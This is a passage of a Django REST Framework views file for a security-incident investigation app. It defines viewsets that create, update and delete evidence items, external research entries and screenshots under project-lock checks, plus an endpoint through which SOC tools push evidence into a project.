    permission_classes = [InvestigationItemPermission]
    parser_classes = [MultiPartParser, FormParser, JSONParser]

    def get_queryset(self):
        qs = super().get_queryset()
        project_id = self.request.query_params.get('project')
        if project_id:
            qs = qs.filter(project_id=project_id)
        return qs

    def perform_create(self, serializer):
        project = serializer.validated_data.get('project')
        assert_project_unlocked(project)
        analyst = (serializer.validated_data.get('analyst_name') or '').strip()
        if not analyst:
            analyst = get_user_display_name(self.request.user)
        instance = serializer.save(analyst_name=analyst)
        files = self.request.FILES.getlist('screenshots_upload')
        captions = self.request.data.getlist('screenshot_captions') if hasattr(self.request.data, 'getlist') else []
        for idx, img_file in enumerate(files):
            caption = captions[idx] if idx < len(captions) else ""
            EvidenceScreenshot.objects.create(
                evidence=instance,
                image=img_file,
                caption=caption,
                analyst_name=instance.analyst_name,
            )
        instance.project.sync_archive_manifest()

    def perform_update(self, serializer):
        assert_project_unlocked(serializer.instance.project)
        if 'project' in serializer.validated_data:
            assert_project_unlocked(serializer.validated_data['project'])
        instance = serializer.save()
        files = self.request.FILES.getlist('screenshots_upload')
        captions = self.request.data.getlist('screenshot_captions') if hasattr(self.request.data, 'getlist') else []
        for idx, img_file in enumerate(files):
            caption = captions[idx] if idx < len(captions) else ""
            EvidenceScreenshot.objects.create(
                evidence=instance,
                image=img_file,
                caption=caption,
                analyst_name=instance.analyst_name,
            )
        instance.project.sync_archive_manifest()

    def perform_destroy(self, instance):
        project = instance.project
        assert_project_unlocked(project)
        instance.delete()
        project.sync_archive_manifest()

    @action(detail=True, methods=['post'])
    def toggle_key(self, request, pk=None):
        item = self.get_object()
        assert_project_unlocked(item.project)
        item.is_key_evidence = not item.is_key_evidence
        item.save(update_fields=['is_key_evidence', 'updated_at'])
        item.project.sync_archive_manifest()
        return Response(self.get_serializer(item).data)


class ExternalResearchViewSet(viewsets.ModelViewSet):
    queryset = ExternalResearch.objects.select_related('project').all()
    serializer_class = ExternalResearchSerializer
    permission_classes = [InvestigationItemPermission]

    def get_queryset(self):
        qs = super().get_queryset()
        project_id = self.request.query_params.get('project')
        if project_id:
            qs = qs.filter(project_id=project_id)
        return qs

    def perform_create(self, serializer):
        project = serializer.validated_data.get('project')
        assert_project_unlocked(project)
        analyst = (serializer.validated_data.get('analyst_name') or '').strip()
        if not analyst:
            analyst = get_user_display_name(self.request.user)
        instance = serializer.save(analyst_name=analyst)
        instance.project.sync_archive_manifest()

    def perform_update(self, serializer):
        assert_project_unlocked(serializer.instance.project)
        if 'project' in serializer.validated_data:
            assert_project_unlocked(serializer.validated_data['project'])
        instance = serializer.save()
        instance.project.sync_archive_manifest()

    def perform_destroy(self, instance):
        project = instance.project
        assert_project_unlocked(project)
        instance.delete()
        project.sync_archive_manifest()


class EvidenceScreenshotViewSet(viewsets.ModelViewSet):
    queryset = EvidenceScreenshot.objects.select_related('evidence__project').all()
    serializer_class = EvidenceScreenshotSerializer
    permission_classes = [InvestigationItemPermission]
    parser_classes = [MultiPartParser, FormParser, JSONParser]

    def perform_create(self, serializer):
        evidence = serializer.validated_data.get('evidence')
        assert_project_unlocked(evidence.project)
        analyst = (serializer.validated_data.get('analyst_name') or '').strip()
        if not analyst:
            analyst = get_user_display_name(self.request.user)
        instance = serializer.save(analyst_name=analyst)
        instance.evidence.project.sync_archive_manifest()

    def perform_update(self, serializer):
        assert_project_unlocked(serializer.instance.evidence.project)
        if 'evidence' in serializer.validated_data:
            assert_project_unlocked(serializer.validated_data['evidence'].project)
        instance = serializer.save()
        instance.evidence.project.sync_archive_manifest()

    def perform_destroy(self, instance):
        project = instance.evidence.project
        assert_project_unlocked(project)
        instance.delete()
        project.sync_archive_manifest()


class SOCIngestAPIView(APIView):
    """
    Integration endpoint for existing Python/Django SOC tools (SIEM, SOAR, IDS)
    to programmatically push Atomic or Search Result evidence into an incident project.
    Requires Analyst, Admin, or Super Admin credentials (e.g. `Authorization: Token <token>`).
    """
    permission_classes = [InvestigationItemPermission]

    def post(self, request):
        project_id = request.data.get('project_id') or request.data.get('project')
        ticket_id = request.data.get('ticket_id')

        project = None
        if project_id:
            project = Project.objects.filter(pk=project_id).first()
        elif ticket_id:
            project = Project.objects.filter(ticket_id=ticket_id).first()

        if not project:
            return Response(
                {"error": "Specify a valid 'project_id' or 'ticket_id' to ingest evidence."},
                status=status.HTTP_400_BAD_REQUEST,
            )

        assert_project_unlocked(project)

        payload = request.data.copy()
        payload['project'] = project.pk
        if not (payload.get('analyst_name') or '').strip():
            payload['analyst_name'] = get_user_display_name(request.user)
        serializer = EvidenceItemSerializer(data=payload)
        serializer.is_valid(raise_exception=True)
        item = serializer.save()
        project.sync_archive_manifest()
        return Response(EvidenceItemSerializer(item).data, status=status.HTTP_201_CREATED)
